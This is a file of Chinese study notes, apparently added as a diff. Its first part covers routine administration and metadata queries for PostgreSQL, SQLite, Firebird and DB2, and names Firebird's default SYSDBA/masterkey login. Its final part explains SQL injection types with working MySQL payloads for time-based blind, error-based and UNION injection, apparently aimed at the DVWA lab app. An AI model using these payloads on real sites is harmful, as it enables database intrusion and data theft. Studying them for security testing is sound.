+如何查询postgreSQL 里面某个数据库中所有用户定义的数据表的名字(http://www.2cto.com/database/201111/111061.html)
+1、通过命令行查询
+\d 数据库  —— 得到所有表的名字
+\d 表名  —— 得到表结构
+2、通过SQL语句查询
+"select * from pg_tables"  —— 得到当前db中所有表的信息（这里pg_tables是系统视图）
+"select tablename from pg_tables where schemaname='public'"  ——  得到所有用户自定义表的名字（这里"tablename"字段是表的名字，"schemaname"是schema的名字。用户自定义的表，如果未经特殊处理，默认都是放在名为public的schema下）
+
+
+
+
+===================================================================================
+SQLite===================================================================================
+[取得sqlite数据库里所有的表名 &复制表](http://blog.csdn.net/vlily/article/details/9096909)
+取得sqlite数据库里所有的表名
+查询table，type 段是'table'，name段是table的名字, so:
+select name from sqlite_master where type='table' order by name;
+
+查询indices，type段是'index', name 是index的名字，tbl_name是index所拥有的table的名字
+通过以下语句可查询出某个表的所有字段信息
+PRAGMA table_info([tablename])
+------------------------------------------------------------------------------------------------
+（1）复制表，并把原表的 所有记录都复制到新表里。
+CREATE TABLE newTb AS SELECT * FROM oldTb
+
+(2）只复制表j结构，不复制数据到新表里。
+：该语句无法复制关键值
+CREATE TABLE newTb AS SELECT * FROM oldTb WHERE 1=0
+
+(3）精准时间到毫秒
+SELECT strftime('%Y-%m-%d %H:%M:%f', 'now', 'localtime') FROM sqlite_master
+SELECT strftime('%Y-%m-%d %H:%M:%f', [TimeFiled]) AS Expr1 FROM YourTable
+
+数据库设置默认字段Default Value： (strftime('%Y-%m-%d %H:%M:%f', 'now', 'localtime'))
+在SQL中有如下两种方法可以实现将一个表中数据到另一个表中
+
+1> select ... into new_tablename from ... where ...
+2> insert (into) old_tablename select ... from ... where ...
+区别是前者把数据插入一个新表（先建立表，再插入数据），
+后者是把数据插入已经存在的一个表中，我个人喜欢后者，因为在编程的结构上，应用的范围上，第二条语句强于前者。
+用方法2可在Sqlite中实现将limitinfo中部分数据拷贝到processlist中
+
+insert into processlist select null,type,NAME,isuse from limitinfo where mac='00:E0:B1:09:95:C2'
+
+之所以select子句第一个是null，是因为表中第一个参数是INTEGER自增，填充null后可以保证数据Id是自增的。
+
+
+
+
+===================================================================================
+Microsoft Access===================================================================================
+
+
+===================================================================================
+FireBird===================================================================================
+[Firebird数据库常用SQL语句](http://www.du52.com/text.php?id=182)
+Firebird常用SQL
+一、分页写法小例：
+select first 10 templateid,code,name from template ;
+select first 10 skip 10 templateid,code,name from template ;
+select * from shop rows 1 to 10; --firebird2.0支持这种写法
+
+二、show
+　
+show tables;
+show table tablename;
+
+三、
+ D:\firebird2\bin>isql -u sysdba -p masterkey
+ connect "E:\company\xmwsoft\newxmwsoft\c2\db\cts2.fdb";
+四、--更新字段注释
+update RDB$RELATION_FIELDS set RDB$DESCRIPTION = '描述信息' where (RDB$RELATION_NAME = 'SHOP') and (RDB$FIELD_NAME = 'CREDIT_BUY')
+
+五、--显示字段注释
+select RDB$FIELD_NAME,RDB$DESCRIPTION from RDB$RELATION_FIELDS where (RDB$RELATION_NAME = 'SHOP') and (RDB$FIELD_NAME = 'CREDIT_BUY')
+
+六、--更新表注释
+update RDB$RELATIONS set RDB$DESCRIPTION = '描述信息' where RDB$RELATION_NAME='TABLE_NAME'
+
+七、--查询所有的表和视图（包括系统表和系统视图）
+SELECT RDB$RELATION_NAME FROM RDB$RELATIONS;
+
+八、--查询所有的用户表和用户视图
+SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;
+
+九、--查询所有的用户表
+SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0 AND RDB$VIEW_BLR IS NULL
+
+十、查所有用户表、用户视图所有字段及相关定义
+SELECT a.RDB$RELATION_NAME, b.RDB$FIELD_NAME, b.RDB$FIELD_ID, d.RDB$TYPE_NAME,
+c.RDB$FIELD_LENGTH, c.RDB$FIELD_SCALE
+FROM RDB$RELATIONS a
+INNER JOIN RDB$RELATION_FIELDS b
+ON a.RDB$RELATION_NAME = b.RDB$RELATION_NAME
+INNER JOIN RDB$FIELDS c
+ON b.RDB$FIELD_SOURCE = c.RDB$FIELD_NAME
+INNER JOIN RDB$TYPES d
+ON c.RDB$FIELD_TYPE = d.RDB$TYPE
+WHERE a.RDB$SYSTEM_FLAG = 0
+AND d.RDB$FIELD_NAME = 'RDB$FIELD_TYPE'
+ORDER BY a.RDB$RELATION_NAME, b.RDB$FIELD_ID
+
+
+十一、查找某表的所有字段及相关定义
+SELECT A.RDB$FIELD_NAME, B.RDB$FIELD_TYPE, B.RDB$FIELD_LENGTH, B.RDB$FIELD_PRECISION, B.RDB$FIELD_SCALE
+FROM RDB$RELATION_FIELDS A, RDB$FIELDS B
+WHERE A.RDB$RELATION_NAME = 'tablename'
+AND A.RDB$FIELD_SOURCE = B.RDB$FIELD_NAME
+ORDER BY A.RDB$FIELD_POSITION
+
+
+十二、查找某表的主键定义字段
+select A.RDB$FIELD_NAME FROM RDB$INDEX_SEGMENTS A, RDB$RELATION_CONSTRAINTS B
+WHERE B.RDB$CONSTRAINT_TYPE = 'PRIMARY KEY'
+AND B.RDB$RELATION_NAME = 'tablename'
+AND A.RDB$INDEX_NAME = B.RDB$INDEX_NAME
+ORDER BY A.RDB$FIELD_POSITION
+
+
+十三、查找某表的外键定义
+select r1.RDB$CONSTRAINT_NAME, rind.RDB$FIELD_NAME, r2.RDB$RELATION_NAME
+FROM RDB$RELATION_CONSTRAINTS r1, RDB$RELATION_CONSTRAINTS r2, RDB$REF_CONSTRAINTS ref, RDB$INDEX_SEGMENTS rind
+where r1.RDB$RELATION_NAME = 'tablename'
+and r1.RDB$CONSTRAINT_TYPE = 'FOREIGN KEY'
+and r1.RDB$CONSTRAINT_NAME = ref.RDB$CONSTRAINT_NAME
+and ref.RDB$CONST_NAME_UQ = r2.RDB$CONSTRAINT_NAME
+and r1.RDB$INDEX_NAME = rind.RDB$INDEX_NAME
+
+
+firebird默认的用户名:SYSDBA 密码:masterkey
+
+
+开源的Firebird的可视化管理工具Marathon
+flameRobin也量个开源的可视化管理工具
+1、创建表
+CREATE TABLE table_name
+(
+    column_name {< datatype> | COMPUTED BY (< expr>) | domain}
+        [DEFAULT { literal | NULL | USER}] [NOT NULL]
+    ...
+    CONSTRAINT constraint_name
+        PRIMARY KEY (column_list),
+        UNIQUE      (column_list),
+        FOREIGN KEY (column_list) REFERENCES other_table (column_list),
+        CHECK       (condition),
+    ...
+);
+ 如：create table t1
+(
+    sno1 char(9) primary key,
+    sno2 char(9) references student(sno)
+)
+2、修改表
+(1)增加字段
+alter table table_name add fieldname datetype [not null ,primary key]
+如：alter table student add sex char(2) not null
+    primary key
+    default 'm'
+    CHECK (sex1='f' or sex1='m')
+
+
+ALTER TABLE STUDENT
+ADD AGE INTEGER[1:100]
+DEFAULT 56
+CHECK (age between 20 and 35)
+
+
+ALTER TABLE STUDENT
+ADD AGE INTEGER[1:100]
+DEFAULT 56
+CHECK (age>=20 and age<=35)
+(2)删除字段
+alter table table_name drop fieldname
+ALTER TABLE STUDENT DROP AA
+(3)增加主键
+alter table SCORE
+add constraint PK_SCORE_1
+primary key (ID, CORUSENAME)
+////////////////////////////////////////////////////////////////////////////
+查询:
+SELECT [TRANSACTION transaction]
+[DISTINCT | ALL]
+{* | <val> [, <val> …]}
+[INTO :var [, :var …]]
+FROM <tableref> [, <tableref> …]
+[WHERE <search_condition>]
+[GROUP BY col [COLLATE collation] [, col [COLLATE collation] …]
+[HAVING <search_condition>]
+[UNION <select_expr> [ALL]]
+[PLAN <plan_expr>]
+[ORDER BY <order_list>]
+[FOR UPDATE [OF col [, col …]]];
+
+
+在表上增加外键
+alter table STUDENT
+add constraint FK_STUDENT_1
+foreign key (ID)
+references SCORE (ID)
+///////////////////////////////////////////////////////////////////////
+创建域：
+CREATE DOMAIN domain [AS] <datatype>
+[DEFAULT {literal | NULL | USER}]
+[NOT NULL] [CHECK (<dom_search_condition>)]
+[COLLATE collation];
+如：
+(1)create domain  MyScore  as SMALLINT
+default 0
+check(value between 0 and 100)
+(2)CREATE DOMAIN DEPTNO AS CHAR(3)
+     CHECK ((VALUE = '000') OR
+    (VALUE > '0' AND VALUE <= '999')
+    OR (VALUE IS NULL))
+修改域：
+ALTER DOMAIN name {
+SET DEFAULT {literal | NULL | USER}
+| DROP DEFAULT
+| ADD [CONSTRAINT] CHECK (<dom_search_condition>)
+| DROP CONSTRAINT | new_col_name
+
+
+| TYPE datatype};
+如：
+(1)alter DOMAIN DAGE TYPE INTEGER
+(2)alter DOMAIN DAGE TYPE INTEGER
+set DEFAULT 40
+add constraint CHECK (value  between 10 and 90)
+(3)alter DOMAIN DAGE TYPE INTEGER
+drop   CONSTRAINT
+(4)CREATE DOMAIN prodtype
+    AS VARCHAR(12)
+    DEFAULT 'software' NOT NULL
+    CHECK (VALUE IN ('software', 'hardware', 'other', 'N/A'));
+问题：不知道{USER}是什么意思，怎么用？
+
+连接到数据：
+CONNECT 'filespec' [USER 'username'][PASSWORD 'password']
+[CACHE int] [ROLE 'rolename']
+如：
+connect g:\firebird\test.fdb user 'sysdba' password 'masterkey';//一定要加上‘;’以表示sql语句结束。
+创建索引：
+CREATE [UNIQUE] [ASC[ENDING] | DESC[ENDING]] INDEX index
+ON table (col [, col …]);
+创建视图：
+CREATE VIEW name [(view_col [, view_col …])]
+AS <select> [WITH CHECK OPTION];
+
+创建存储过程
+CREATE PROCEDURE name
+[(param <datatype> [, param <datatype> …])]
+[RETURNS <datatype> [, param <datatype> …])]
+AS <procedure_body> [terminator]
+//////////////////////////////////////////////
+<procedure_body> =
+[<variable_declaration_list>]
+<block>
+////////////////////////////////////////////////
+<variable_declaration_list> =
+DECLARE VARIABLE var <datatype>;
+[DECLARE VARIABLE var <datatype>; …]
+///////////////////////////////////
+
+<block> =
+BEGIN
+<compound_statement>
+[<compound_statement> …]
+END
+
+查询select：
+SELECT [TRANSACTION transaction]
+[DISTINCT | ALL]
+{* | <val> [, <val> …]}
+[INTO :var [, :var …]]
+FROM <tableref> [, <tableref> …]
+[WHERE <search_condition>]
+[GROUP BY col [COLLATE collation] [, col [COLLATE collation] …]
+[HAVING <search_condition>]
+[UNION <select_expr> [ALL]]
+[PLAN <plan_expr>]
+[ORDER BY <order_list>]
+[FOR UPDATE [OF col [, col …]]];
+
+
+注意：plan 和for的用法。
+查询数据的前10行：
+select FIRST 10 skip 2  * from EMPLOYEE
+查询数据的前10行，用关键字first:
+CAST ( <value> | NULL AS datatype)
+From datatype To datatype
+NUMERIC-> CHARACTER, DATE
+CHARACTER-> NUMERIC, DATE
+DATE-> CHARACTER, NUMERIC
+ 连接字符串:||
+如:select id,name||'ddd'
+from STUDENT
+////////////////////////////////////////////////////////////////////
+注意：在InterBase存储过程和触发器语言代码中，除了上面提到的复合语句Begin、End之外，所有的语句必须以分号结束，这一点必须明确。
+单独的sql语句后也不用加分号结束。
+//////////////////////////////////////////
+单行选择语句Select…Into： 将选择的结果存储到Into之后的变量中，into子句必须放在整个选择语句的末尾。例如： Select Count(*) from Employee Into :varcount；
+////////////////////////////////////////////////////////////////////
+多行选择语句FOR select_statement DO compound_statement:
+对select_statement返回的每一条记录重复执行compounde_statement语句，实际是一个循环结构。其中：select_statement是必须带有into子句的选择语句，而且into子句必须放在选择语句的末尾，而且后面不能跟分号。使用该语句可以返回多个数据行。语法结构是： For select_statement Do Compound_statement
+/////////////////////////////////////////////////////////
+IF （condition） THEN compound_statement[ELSE compound_statement]:
+/////////////////////////////////////////////////////////////
+SUSPEND： 暂时终止即挂起存储过程的执行,并将参数返回给客户端。这是存储过程专用的语句。
+//////////////////////////////////////////////////////////////////
+WHILE condition DO compound_statement： 当condition条件为真时，重复执行compounde_statement语句，直到condition条件为假时退出。
+///////////////////////////////////////////////////////////////////////
+WHEN{error[,error…]|ANY} DO compound_statement:
+错误处理语句。当指定的错误之一出现时，执行compound_statement语句。如果使用了WHEN，那么必须将其放在整个存储过程或触发器的最后一个语句。error可以是异常、SQLCODE错误码、GDSCODE代码。ANY表示处理任何错误。
+///////////////////////////////////////////////////
+注意：在存储过程中，除了Create Procedure,As,Begin…End语句之外，任何其他语句末尾都要添加分号结束。因此，如果你使用isql创建存储过程，你必须另外定义其它的符号来代表创建存储过程的结束，通常使用set term语句完成。比如，在创建存储过程之前，使用set term !! ;把！！作为分号来表示存储过程创建的结束，在创建存储过程的语句之后，再用set term ; !!恢复分号的作用。如：
+Set Term ## ; Create Procedure Add_Emp_Proj (Emp_No Smallint, Proj_Id Char(5)) As Begin
+Begin
+Insert Into Employee_Project (Emp_No, Proj_Id) Values (:Emp_No, :Proj_Id);
+ When Sqlcode -530 Do Exception Unknown_Emp_Id;
+End Return;
+End ##
+Set Term ; ##
+
+
+特别注意：不论是输入参数、输出参数还是局部变量，如果在SQL语句中使用，前面必须加上冒号。如果不和SQL语句一起使用，则不要加冒号。
+//////////////////////////////////
+在存储过程中不要使用标准的select语句返回多行数据，而是要使用FOR…SELECT…INTO循环和SUSPEND语句通过输出参数来完成。
+///////////////////////
+删除存储过程
+要删除一个存储过程，可以使用Drop Procedure语句。不过你要注意如下的一些限制：
+·不能删除一个被其它存储过程、触发器、视图引用的存储过程，必须先将这种引用关系解除，然后才能删除存储过程。
+·不能删除一个递归或者与其它存储过程形成循环依赖关系的存储过程，必须先解除这种递归或者循环依赖关系才能删除存储过程。
+·如果存储过程正被活动事务使用，则必须等事务结束后才能删除。
+·只有超级用户和存储过程的创建者才能删除存储过程。
+//////////////////////
+
+
+
+
+===================================================================================
+SAP MaxDB===================================================================================
+
+
+===================================================================================
+Sybase===================================================================================
+
+
+
+===================================================================================
+IBM DB2===================================================================================
+[db2常用命令大全 db2数据库中的操作命令](http://www.cr173.com/html/42475_1.html)
+
+===================================================
+一、加载数据：
+1、 以默认分隔符加载,默认为“,”号
+db2 "import from btpoper.txt of del insert into btpoper"
+2、 以指定分隔符“|”加载
+db2 "import from btpoper.txt of del modified by coldel| insert into btpoper"
+二、卸载数据：
+1、 卸载一个表中全部数据
+db2 "export to btpoper.txt of del select * from btpoper"
+db2 "export to btpoper.txt of del modified by coldel| select * from btpoper"
+2、 带条件卸载一个表中数据
+db2 "export to btpoper.txt of del select * from btpoper where brhid='907020000'"
+db2 "export to cmmcode.txt of del select * from cmmcode where codtp='01'"
+db2 "export to cmmcode.txt of del modified by coldel| select * from cmmcode where codtp='01'"
+三、查询数据结构及数据：
+db2 "select * from btpoper"
+db2 "select * from btpoper where brhid='907020000' and oprid='0001'"
+db2 "select oprid,oprnm,brhid,passwd from btpoper"
+四、删除表中数据：
+db2 "delete from btpoper"
+db2 "delete from btpoper where brhid='907020000' or brhid='907010000'"
+五、修改表中数据：
+db2 "update svmmst set prtlines=0 where brhid='907010000' and jobtp='02'"
+db2 "update svmmst set prtlines=0 where jobtp='02' or jobtp='03'"
+六、联接数据库
+db2 connect to btpdbs
+七、清除数据库联接
+db2 connect reset 断开数据库连接
+db2 terminate 断开数据库连接
+db2 force applications all 断开所有数据库连接
+八、备份数据库
+1、 db2 backup db btpdbs
+2、 db2move btpdbs export
+db2look -d btpdbs -e -x [-a] -o crttbl.sql
+九、恢复数据库
+1、 db2 restore db btpdbs without rolling forward
+2、 db2 -tvf crtdb.sql
+crtdb.sql文件内容：create db btpdbs on /db2catalog
+db2 -stvf crttbl.sql
+db2move btpdbs import
+十、DB2帮助命令：
+db2 ?
+db2 ? restroe
+db2 ? sqlcode (例：db2 ? sql0803) 注：code必须为4位数，不够4位，前面补0
+
+十一、bind命令：将应用程序与数据库作一捆绑,每次恢复数据库后，建议都要做一次bind
+(1) db2 bind br8200.bnd
+(2) /btp/bin/bndall /btp/bnd
+/btp/bin/bndall /btp/tran/bnd
+十二、查看数据库参数：
+db2 get dbm cfg
+db2 get db cfg for btpdbs
+十三、修改数据库参数：
+db2 update db cfg for btpdbs using LOGBUFSZ 20
+db2 update db cfg for btpdbs using LOGFILSIZ 5120
+改完后，应执行以下命令使其生效：
+db2 stop
+db2 start
+
+补充：
+db2 set schema btp 修改当前模式为"btp"
+db2 list tablespaces show detail 查看当前数据库表空间分配状况
+db2 list tablespace containers for 2 show detail 查看tablespace id=2使用容器所在目录
+db2 list application
+db2 list db directory 列出所有数据库
+db2 list active databases 列出所有活动的数据库
+db2 list tables for all 列出当前数据库下所有的表
+db2 list tables for schema btp 列出当前数据库中schema为btp的表
+db2 list tablespaces show detail 显示数据库空间使用情况
+db2 list packages for all
+
+db2 "import from tab76.ixf of ixf commitcount 5000 insert into achact"
+db2 "create table achact_t like achact"
+db2 "rename table achact_t to achact"
+db2 "insert into achact_t select * from achact where txndt>=(select lstpgdt from
+acmact where actno=achact.actno)"
+db2 get snapshot for dynaimic sql on jining
+删除一个实例：
+# cd /usr/lpp/db2_07_01/instance
+# ./db2idrop InstName
+列出所有DB2实例：
+# cd /usr/lpp/db2_07_01/bin
+# ./db2ilist
+为数据库建立编目
+$ db2 catalog db btpdbs on /db2catalog
+取消已编目的数据库btpdbs
+$ db2 uncatalog db btpdbs
+查看版本
+# db2level
+显示当前数据库管理实例
+$ db2 get instance
+设置实例系统启动时是否自动启动。
+$ db2iauto -on 自动启动
+$ db2iauto -off 不自动启动
+数据库优化命令：
+reorg、runstats
+当数据库经过一段时间使用，数据空间会变得越来越庞大。一些delete掉
+的数据仍存放在数据库中，占用数据空间，影响系统性能。因此需要定期
+运行reorg、runstats命令，清除已delete的数据，优化数据结构。
+db2 reorg table 表名
+db2 runstats on table 表名 with distribution and indexes all
+因为要优化的表比较多，所以在/btp/bin目录下提供了一个sh程序runsall，
+可在当天业务结束后，运行runsall，对数据库进行优化
+
+在DB2的开发过程中，贯穿整个开发过程还有很重要的一部分工作就是数据库的维护；对于维护一个庞大信息系统来说是非常必要的；留一份简易的维护手册，以备不时之需；以下收集到的部分维护命令，以飨我们的维护工程师和项目经理。
+=================================================================
+38、更改db2日志空间的大小
+备注：以下命令为了防止db2数据库过份使用硬盘空间而设，仅用于开发者自己机器上的db2，如果是服务器，则参数需要修改。
+# db2 UPDATE DB CFG FOR <db name> USING logretain OFF logprimary 3 logsecond 2 logfilsiz 25600;
+如果页大小是4KB，则以上命令创建3个100M的日志文件，占用300MB硬盘空间。25600*4KB=102400KB。
+39、创建临时表空间
+#DB2 CREATE USER TEMPORARY TABLESPACE STMASPACE PAGESIZE 32 K MANAGED BY DATABASE USING (FILE 'D:\DB2_TAB\STMASPACE.F1' 10000) EXTENTSIZE 256
+40、创建表空间
+rem 创建缓冲池空间 8K
+#db2 connect to gather
+#db2 CREATE BUFFERPOOL STMABMP IMMEDIATE SIZE 25000 PAGESIZE 8K
+rem 创建表空间：STMA
+rem 必须确认路径正确
+rem D:\DB2Container\Stma
+#db2 drop tablespace stma
+#db2 CREATE REGULAR TABLESPACE STMA PAGESIZE 8 K MANAGED BY SYSTEM USING ('D:\DB2Container\Stma' ) EXTENTSIZE 8 OVERHEAD 10.5 PREFETCHSIZE 8 TRANSFERRATE 0.14 BUFFERPOOL STMABMP DROPPED TABLE recovery OFF
+#db2 connect reset
+41、将暂挂的数据恢复到前滚状态
+#db2 ROLLFORWARD DATABASE testDB TO END OF LOGS AND COMPLETE NORETRIEVE
+
+42、备份表空间
+#BACKUP DATABASE YNDC TABLESPACE ( USERSPACE1 ) TO "D:\temp" WITH 2 BUFFERS BUFFER 1024 PARALLELISM 1 WITHOUT PROMPTING
+43、创建db2工具数据库
+#db2 create tools catalog systools create new database toolsdb
+44、如何进行增量/差量备份
+增量：上一次完整备份至本次备份之间增加的数据部分；
+差量(delta)：上次备份以来（可能是完整备份、增量备份或者差量备份）至本次备份之间增加的数据部分；
+45、更新所有表的统计信息
+#db2 -v connect to DB_NAME
+#db2 -v "select tbname, nleaf, nlevels, stats_timefrom sysibm.sysindexes"
+#db2 -v reorgchkupdate statistics on table all
+#db2 -v "select tbname, nleaf, nlevels, stats_timefrom sysibm.sysindexes"
+#db2 -v terminate
+
+46、对一张表运行统计信息
+#db2 -v runstatson table TAB_NAMEand indexes all
+47、查看是否对数据库执行了RUNSTATS
+#db2 -v "select tbname, nleaf, nlevels,stats_timefrom sysibm.sysindexes"
+48、更改缓冲池的大小
+缓冲池中，当syscat.bufferpools的npages是-1时，由数据库的配置参数bufferpage控制缓冲池的大小。
+将npages的值更改为-1的命令：
+#db2 -v connect to DB_NAME
+#db2 -v select * from syscat.bufferpools
+#db2 -v alter bufferpoolIBMDEFAULTBP size -1
+#db2 -v connect reset
+#db2 -v terminate
+更改数据库配置参数BufferPages的命令如下：
+#db2 -v update db cfgfor dbnameusing BUFFPAGE bigger_value
+#db2 -v terminate
+49、看数据库监视内容列表
+#db2 -v get monitor switches
+50、打开某个数据库监视内容
+#db2 -v update monitor switches using bufferpoolon
+51、获取数据库快照
+#db2 -v get snapshot for all databases > snap.out
+#db2 -v get snapshot for dbm>> snap.out
+#db2 -v get snapshot for all bufferpools>> snap.out
+#db2 -v terminate
+
+52、重置数据库快照
+#db2 -v reset monitor all
+53、计算缓冲池命中率
+理想情况下缓冲池命中率在95%以上，计算公式如下：
+(1 -((buffer pool data physical reads + buffer pool index physical reads)
+/(buffer pool data logical reads + pool index logical reads))) *100%
+=========数据库实例========================
+54、创建db2实例
+#db2icrt <实例名称>
+55、删除db2实例
+#db2idrop <实例名称>
+56、设置当前db2实例
+#set db2intance=db2
+57、显示db2拥有的实例
+#db2ilist
+58、恢复离线增量备份数据库的命令
+#DB2 RESTORE DATABASE YNDC INCREMENTAL AUTOMATIC FROM D:\backup\autobak\db2 TAKEN AT 20060314232015
+59、创建样本数据库
+在unix平台，使用：
+#sqllib/bin/db2sampl <path>
+在windows,os/2平台，使用：db2sampl e,e是可选参数，指定将创建数据库的驱动器
+
+60、设置联合数据库为可用（默认联合数据库不可用）
+
+#db2 update dbm cfg using federated yes
+
+61、列出数据库中所有的表
+#db2 list tables
+62、数据迁移方法1
+export脚本示例
+#db2 connect to testdb user test password test
+#db2 "export to aa1.ixf of ixf select * from table1"
+#db2 "export to aa2.ixf of ixf select * from table2"
+#db2 connect reset
+import脚本示例
+#db2 connect to testdb user test password test
+#db2 "load from aa1.ixf of ixf replace into table1 COPY NO without prompting "
+#db2 "load from aa2.ixf of ixf replace into table2 COPY NO without prompting "
+
+DB2常用命令总结
+
+1．启动数据库
+    db2start
+2．停止数据库
+    db2stop
+3．连接数据库
+    db2 connect to o_yd user db2 using pwd
+4．读数据库管理程序配置
+    db2 get dbm cfg
+5．写数据库管理程序配置
+    db2 update dbm cfg using 参数名 参数值
+6．读数据库的配置
+    db2 connect to o_yd user db2 using pwd
+    db2 get db cfg for o_yd
+7．写数据库的配置
+    db2 connect to o_yd user db2 using pwd
+    db2 update db cfg for o_yd using 参数名 参数值
+8．关闭所有应用连接
+    db2 force application all
+    db2 force application ID1,ID2,,,Idn MODE ASYNC
+    (db2 list application for db o_yd show detail)
+9．备份数据库
+    db2 force application all
+    db2 backup db o_yd to d:
+   (db2 initialize tape on //./tape0)
+   (db2 rewind tape on //./tape0)
+   db2 backup db o_yd to //./tape0
+10．恢复数据库
+   db2 restore db o_yd from d: to d:
+   db2 restore db o_yd from //./tape0 to d:
+11．绑定存储过程
+   db2 connect to o_yd user db2 using pwd
+   db2 bind c:/dfplus.bnd
+ 拷贝存储过程到服务器上的C:/sqllib/function目录中
+12．整理表
+   db2 connect to o_yd user db2 using pwd
+   db2 reorg table ydd
+   db2 runstats on table ydd with distribution and indexes all
+13．导出表数据
+    db2 export to c:/dftz.txt of del select * from dftz
+    db2 export to c:/dftz.ixf of ixf select * from dftz
+14．导入表数据
+import from c:/123.txt of del  insert into ylbx.czyxx
+db2 import to c:/dftz.txt of del commitcount 5000 messages  c:/dftz.msg insert into dftz
+db2 import to c:/dftz.ixf of ixf commitcount 5000 messages c:/dftz.msg insert into dftz
+db2 import to c:/dftz.ixf of ixf commitcount 5000 insert into dftz
+db2 import to c:/dftz.ixf of ixf commitcount 5000 insert_update into dftz
+db2 import to c:/dftz.ixf of ixf commitcount 5000 replace into dftz
+db2 import to c:/dftz.ixf of ixf commitcount 5000 create into dftz   (仅IXF)
+db2 import to c:/dftz.ixf of ixf commitcount 5000 replace_create into dftz  (仅IXF)
+
+15．执行一个批处理文件
+      db2 –tf 批处理文件名
+     （文件中每一条命令用 ；结束）
+16．自动生成批处理文件
+    建文本文件：temp.sql
+    select 'runstats on table DB2.' || tabname || ' with distribution and  detailed indexes all;' from syscat.tables where
+tabschema='DB2' and type='T';
+db2 –tf temp.sql>runstats.sql
+17．自动生成建表（视图）语句
+在服务器上：C:/sqllib/misc目录中
+db2 connect to o_yd user db2 using pwd
+db2look –d o_yd –u db2 –e –p –c c:/o_yd.txt
+18．其他命令
+grant dbadm on database to user bb
+19
+select * from czyxx fetch first 1 rows only
+20
+db2look –d ylbx –u db2admin –w –asd –a –e –o a.txt
+21. 显示当前用户所有表
+　list tables
+22. 列出所有的系统表
+　list tables for system
+23. 查看表结构
+db2 describe select * from user.tables
+24. 查看死锁明细
+db2 get snapshot for locks on yourdatdabasename
+用df －k命令看看是否有些文件系统没有空间.
+
+
+===================================================================================
+HSQLLDB===================================================================================
+
+
+
+===================================================================================
+===================================================================================
+
+2、基于时间的盲注（Time-based blind SQL injection），即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+比如直接把某个参数的值删除，改为if((ascii(mid(user(),1,1))=103 and sleep(3))如果ascii(mid(user(),1,1))=103条件为真，则会等待3秒才返回结果，如果ascii(mid(user(),1,1))=103为假，则直接返回页面，这样不断猜测user()的第1,2,3个字符。
+===================================================================================
+MySQL===================================================================================
+select first_name,last_name from users where user_id=' 1' AND 4463=IF((8703>8706),SLEEP(5),4463)-- cMCw
+
+select first_name,last_name from users where user_id='1' and 0=if(ascii(mid(database(),1,1))=103,sleep(3),10)
+select first_name,last_name from users where user_id='1' and 0=if(ascii(mid(database(),1,1))=103,sleep(3),10)
+猜测数据库名
+
+select ascii(mid(database(),2,1))
+select mid(user(),1,100)
+select mid(version(),1,100)
+select mid(@@version,1,100)
+select mid(@@hostname,1,100)
+
+select mid(1<(select count(*) from information_schema.tables),1,100)
+#根据表的个数来进行判断,是否需要进行延迟执行
+select first_name,last_name from users where user_id='1' and 0=(if (ascii(mid(1<(select count(*) from information_schema.tables),1,100))=49,sleep(3),10))
+
+猜测表名
+===================================================================================
+Oracle===================================================================================
+
+
+
+===================================================================================
+SQL Server===================================================================================
+
+
+
+
+===================================================================================
+PostgreSQL===================================================================================
+
+
+===================================================================================
+SQLite===================================================================================
+
+
+===================================================================================
+Microsoft Access===================================================================================
+
+
+===================================================================================
+FireBird===================================================================================
+
+
+
+===================================================================================
+SAP MaxDB===================================================================================
+
+
+===================================================================================
+Sybase===================================================================================
+
+
+
+===================================================================================
+IBM DB2===================================================================================
+
+
+===================================================================================
+HSQLLDB===================================================================================
+
+
+
+
+===================================================================================
+===================================================================================
+
+3、基于报错注入（Error-based SQL injection），即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+比如在条件后面增加+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)，通过报错把user()显示出来，这个方法是最快的。
+这里报错注入的sql很不好理解，首先它实现的前提是如果sql报错了，后台配置的按照sql怎么出错怎么抛出异常到页面（即非友好页面），然后比如这里报错主要依靠floor(rand(0)*2)，rand(0)是mysql的一个函数，他会返回0到1之间的随机浮点数，rand(0)*2为1到2之间的随机浮点数，floor是往下取整的函数，比如floor(0.2)=0,floor(1.2)=1。这里group by x就非常重要了，比如我们查询select 1 from information_schema.tables group by rand(0) limit 0,30;将会查询30个1出来，原因是group by 一个随机数，每次都将查询不同的数据出来，limit限制30就显示30条。所以刚才试的sql语句，因为group by x，x的值是随机的，比如x值为~root@127.0.0.1~0，也可能为~root@127.0.0.1~1，group by 这个数据如果遇到两个相同的group key，则就报错了，如果页面吧错误抛出到页面，则可以通过正则匹配~和~符号之间的为user()的值，比如报错：Duplicate entry '~root@127.0.0.1~1' for key 'group_key'。
+===================================================================================
+MySQL===================================================================================
+
+
+===================================================================================
+Oracle===================================================================================
+
+
+
+===================================================================================
+SQL Server===================================================================================
+
+
+
+
+===================================================================================
+PostgreSQL===================================================================================
+
+
+===================================================================================
+SQLite===================================================================================
+
+
+===================================================================================
+Microsoft Access===================================================================================
+
+
+===================================================================================
+FireBird===================================================================================
+
+
+
+===================================================================================
+SAP MaxDB===================================================================================
+
+
+===================================================================================
+Sybase===================================================================================
+
+
+
+===================================================================================
+IBM DB2===================================================================================
+
+
+===================================================================================
+HSQLLDB===================================================================================
+
+
+
+
+===================================================================================
+===================================================================================
+
+4、联合查询注入（UNION query SQL injection），可以使用union的情况下的注入。
+这个很好理解，就是在select后union把数据查询出来，比如先在查询条件后输入order by 3,order by 4..到order by 8的时候报错了，说明select了7条记录。然后条件后输入 and 1=2 union select 1,user(),database()...查询7个数据出来，由于第一个select后有了1=2条件不成i，因此只会查询我们写的select语句，这样覆盖之前的查询记录返回出我们需要的数据，这个速度也非常快。
+===================================================================================
+MySQL===================================================================================
+select first_name,last_name from users where user_id='11' and 1=2 union all select first_name,last_name from users #
+拖数据库名
+select first_name,last_name from dvwa.users where user_id='1' and 1=2 union all select schemA_name,null from information_schema.schemata  #
+
+select first_name,last_name from dvwa.users where user_id='1' and 1=2 union all select schemA_name,null from information_schema.schemata where substring(schema_name,1,1)='d'  #
+拖出表名
+select first_name,last_name from dvwa.users where user_id='1' and 1=2 union all select table_name,null from information_schema.tables where table_schema='dvwa'  #
+拖出列名
